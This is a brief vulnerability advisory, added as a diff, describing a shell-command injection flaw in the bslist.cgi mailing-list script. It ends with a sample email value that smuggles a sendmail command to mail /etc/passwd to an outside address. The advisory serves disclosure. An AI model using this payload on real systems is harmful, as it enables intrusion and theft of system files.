@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/2160/info
+
+An input validation vulnerability exists in Brian Stanback's bslist.cgi, a script designed to coordinate mailing lists.
+
+The script fails to properly filter ';' characters from the user-supplied email addresses collected by the script.
+
+As a result, maliciously-formed values for this field can cause the the script to run arbitrary shell commands with the privilege level of the web server. 
+
+This can be exploited by signing up for the mailing list with the email address of
+
+'hacker@example.com;/usr/sbin/sendmail hacker@example.com < /etc/passwd'
